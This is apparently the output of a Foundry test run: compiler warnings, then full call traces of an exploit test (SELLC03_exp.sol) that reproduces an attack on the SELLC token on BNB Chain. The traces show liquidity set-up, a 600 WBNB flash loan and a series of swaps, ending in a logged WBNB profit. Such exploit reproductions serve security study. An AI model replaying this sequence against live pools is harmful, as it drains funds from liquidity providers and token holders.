@@ -1,0 +1,432 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.25s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-06/SELLC03_exp.sol:25:5:
+   |
+25 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-06/SELLC03_exp.sol:26:5:
+   |
+26 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:1582:1:
+     |
+1582 | interface USDT {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 278.55ms (174.37µs CPU time)
+
+Ran 1 test for src/test/2023-06/SELLC03_exp.sol:ContractTest
+[PASS] testExploit() (gas: 996144)
+Logs:
+  [End] Attacker WBNB balance after exploit: 123.296300556608510348
+
+Traces:
+  [1169044] ContractTest::testExploit()
+    ├─ [623610] 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1::setBNB{value: 10000000000000000}(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955])
+    │   ├─ [2562] SELLC::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   └─ ← [Return] 13999968013150066415287033 [1.399e25]
+    │   ├─ [18075] Router::getAmountsOut(9200000000000000 [9.2e15], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
+    │   │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 32985874594284110135048340 [3.298e25], 139883109334032543171044 [1.398e23], 1686479863 [1.686e9]
+    │   │   ├─ [2893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 552697197403461 [5.526e14], 50438882382178089 [5.043e16], 1686440798 [1.686e9]
+    │   │   └─ ← [Return] [9200000000000000 [9.2e15], 2164030759207520212 [2.164e18], 50425971224048138 [5.042e16]]
+    │   ├─ [151818] Router::swapExactETHForTokens{value: 9200000000000000}(49417451799567175 [4.941e16], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 1686479866 [1.686e9])
+    │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 32985874594284110135048340 [3.298e25], 139883109334032543171044 [1.398e23], 1686479863 [1.686e9]
+    │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 552697197403461 [5.526e14], 50438882382178089 [5.043e16], 1686440798 [1.686e9]
+    │   │   ├─ [23974] WBNB::deposit{value: 9200000000000000}()
+    │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 9200000000000000 [9.2e15])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [8062] WBNB::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 9200000000000000 [9.2e15])
+    │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 9200000000000000 [9.2e15])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [49748] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(2164030759207520212 [2.164e18], 0, SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 0x)
+    │   │   │   ├─ [12871] USDT::transfer(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 2164030759207520212 [2.164e18])
+    │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 2164030759207520212 [2.164e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   └─ ← [Return] 32985872430253350927528128 [3.298e25]
+    │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   └─ ← [Return] 139883118534032543171044 [1.398e23]
+    │   │   │   ├─ emit Sync(reserve0: 32985872430253350927528128 [3.298e25], reserve1: 139883118534032543171044 [1.398e23])
+    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 9200000000000000 [9.2e15], amount0Out: 2164030759207520212 [2.164e18], amount1Out: 0, to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [45264] SELLC_USDT::swap(0, 50425971224048138 [5.042e16], 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 0x)
+    │   │   │   ├─ [10859] SELLC::transfer(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 50425971224048138 [5.042e16])
+    │   │   │   │   ├─ emit Transfer(from: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], to: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, value: 50425971224048138 [5.042e16])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2164583456404923673 [2.164e18]
+    │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   └─ ← [Return] 12911158129951 [1.291e13]
+    │   │   │   ├─ emit Sync(reserve0: 2164583456404923673 [2.164e18], reserve1: 12911158129951 [1.291e13])
+    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 2164030759207520212 [2.164e18], amount1In: 0, amount0Out: 0, amount1Out: 50425971224048138 [5.042e16], to: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1)
+    │   │   │   └─ ← [Stop] 
+    │   │   └─ ← [Return] [9200000000000000 [9.2e15], 2164030759207520212 [2.164e18], 50425971224048138 [5.042e16]]
+    │   ├─ [0] 0x20D815e42eCDEfF5cC14B142DF817825B15b88dD::fallback{value: 300000000000000}()
+    │   │   └─ ← [Stop] 
+    │   ├─ [562] SELLC::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   └─ ← [Return] 13999968063576037639335171 [1.399e25]
+    │   ├─ [562] SELLC::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   └─ ← [Return] 13999968063576037639335171 [1.399e25]
+    │   ├─ [8059] SELLC::transfer(0x000000000000000000000000000000000000dEaD, 5042597122404813 [5.042e15])
+    │   │   ├─ emit Transfer(from: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, to: 0x000000000000000000000000000000000000dEaD, value: 5042597122404813 [5.042e15])
+    │   │   └─ ← [Return] true
+    │   ├─ [9075] Router::getAmountsOut(500000000000000 [5e14], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
+    │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 32985872430253350927528128 [3.298e25], 139883118534032543171044 [1.398e23], 1686479866 [1.686e9]
+    │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 2164583456404923673 [2.164e18], 12911158129951 [1.291e13], 1686479866 [1.686e9]
+    │   │   └─ ← [Return] [500000000000000 [5e14], 117610359193758698 [1.176e17], 663784508524 [6.637e11]]
+    │   ├─ [4720] SELLC::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [562] SELLC::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   └─ ← [Return] 13999968058533440516930358 [1.399e25]
+    │   ├─ [5151] Router::getAmountsOut(500000000000000 [5e14], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 32985872430253350927528128 [3.298e25], 139883118534032543171044 [1.398e23], 1686479866 [1.686e9]
+    │   │   └─ ← [Return] [500000000000000 [5e14], 117610359193758698 [1.176e17]]
+    │   ├─ [64488] Router::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 500000000000000}(115258152009883524 [1.152e17], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 1686479866 [1.686e9])
+    │   │   ├─ [21974] WBNB::deposit{value: 500000000000000}()
+    │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 500000000000000 [5e14])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3262] WBNB::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 500000000000000 [5e14])
+    │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 500000000000000 [5e14])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2531] USDT::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   │   └─ ← [Return] 30379095024956330265 [3.037e19]
+    │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 32985872430253350927528128 [3.298e25], 139883118534032543171044 [1.398e23], 1686479866 [1.686e9]
+    │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   └─ ← [Return] 139883119034032543171044 [1.398e23]
+    │   │   ├─ [21164] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(117610359193758698 [1.176e17], 0, 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 0x)
+    │   │   │   ├─ [6071] USDT::transfer(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, 117610359193758698 [1.176e17])
+    │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, value: 117610359193758698 [1.176e17])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   └─ ← [Return] 32985872312642991733769430 [3.298e25]
+    │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
+    │   │   │   │   └─ ← [Return] 139883119034032543171044 [1.398e23]
+    │   │   │   ├─ emit Sync(reserve0: 32985872312642991733769430 [3.298e25], reserve1: 139883119034032543171044 [1.398e23])
+    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 500000000000000 [5e14], amount0Out: 117610359193758698 [1.176e17], amount1Out: 0, to: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   │   └─ ← [Return] 30496705384150088963 [3.049e19]
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] USDT::balanceOf(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) [staticcall]
+    │   │   └─ ← [Return] 30496705384150088963 [3.049e19]
+    │   ├─ [100815] Router::addLiquidity(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955], 30496705384150088963 [3.049e19], 663784508524 [6.637e11], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686479866 [1.686e9])
+    │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   └─ ← [Return] SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]
+    │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 2164583456404923673 [2.164e18], 12911158129951 [1.291e13], 1686479866 [1.686e9]
+    │   │   ├─ [3627] SELLC::transferFrom(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 3959296 [3.959e6])
+    │   │   │   ├─ emit Transfer(from: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 3959296 [3.959e6])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [10834] USDT::transferFrom(0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 663784508524 [6.637e11])
+    │   │   │   ├─ emit Transfer(from: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 663784508524 [6.637e11])
+    │   │   │   ├─ emit Approval(owner: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457218116171868448090 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [73248] SELLC_USDT::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2164584120189432197 [2.164e18]
+    │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   └─ ← [Return] 12911162089247 [1.291e13]
+    │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 1530547326855 [1.53e12])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1172948188 [1.172e9])
+    │   │   │   ├─ emit Sync(reserve0: 2164584120189432197 [2.164e18], reserve1: 12911162089247 [1.291e13])
+    │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 663784508524 [6.637e11], amount1: 3959296 [3.959e6])
+    │   │   │   └─ ← [Return] 1172948188 [1.172e9]
+    │   │   └─ ← [Return] 3959296 [3.959e6], 663784508524 [6.637e11], 1172948188 [1.172e9]
+    │   ├─ [2620] SELLC::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop] 
+    ├─ [0] VM::warp(1686566267 [1.686e9])
+    │   └─ ← [Return] 
+    ├─ [512300] 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476::flashLoan(600000000000000000000 [6e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [509601] 0x85351262f7474Ebe23FfAcD633cf20A491F1325D::flashLoan(600000000000000000000 [6e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00) [delegatecall]
+    │   │   ├─ [29962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 600000000000000000000 [6e20])
+    │   │   │   ├─ emit Transfer(from: 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 600000000000000000000 [6e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [455713] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 600000000000000000000 [6e20], 0, 0x00)
+    │   │   │   ├─ [88835] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(200000000000000000000 [2e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [10225] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 200000000000000000000 [2e20])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 200000000000000000000 [2e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6420667709636754537231760 [6.42e24], 682022925232027846709 [6.82e20], 1686479743 [1.686e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 882022925232027846709 [8.82e20]
+    │   │   │   │   ├─ [62367] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(1453079859194107220016666 [1.453e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [27959] SELLC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1453079859194107220016666 [1.453e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1453079859194107220016666 [1.453e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4967587850442647317215094 [4.967e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 882022925232027846709 [8.82e20]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 4967587850442647317215094 [4.967e24], reserve1: 882022925232027846709 [8.82e20])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 200000000000000000000 [2e20], amount0Out: 1453079859194107220016666 [1.453e24], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1453079859194107220016666 [1.453e24]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1453079859194107220016666 [1.453e24]
+    │   │   │   ├─ [39412] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(14530798591941072200166 [1.453e22], 0, [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [5627] SELLC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 14530798591941072200166 [1.453e22])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 14530798591941072200166 [1.453e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10000000000000000 [1e16]
+    │   │   │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2164584120189432197 [2.164e18], 12911162089247 [1.291e13], 1686479866 [1.686e9]
+    │   │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14530798604852234289413 [1.453e22]
+    │   │   │   │   ├─ [22076] SELLC_USDT::swap(2164584118261297306 [2.164e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [6071] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2164584118261297306 [2.164e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2164584118261297306 [2.164e18])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1928134891 [1.928e9]
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14530798604852234289413 [1.453e22]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1928134891 [1.928e9], reserve1: 14530798604852234289413 [1.453e22])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 14530798591941072200166 [1.453e22], amount0Out: 2164584118261297306 [2.164e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2174584118261297306 [2.174e18]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1438549060602166147816500 [1.438e24]
+    │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2174584118261297306 [2.174e18]
+    │   │   │   ├─ [55697] Router::addLiquidity(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955], 1438549060602166147816500 [1.438e24], 2174584118261297306 [2.174e18], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]
+    │   │   │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1928134891 [1.928e9], 14530798604852234289413 [1.453e22], 1686566267 [1.686e9]
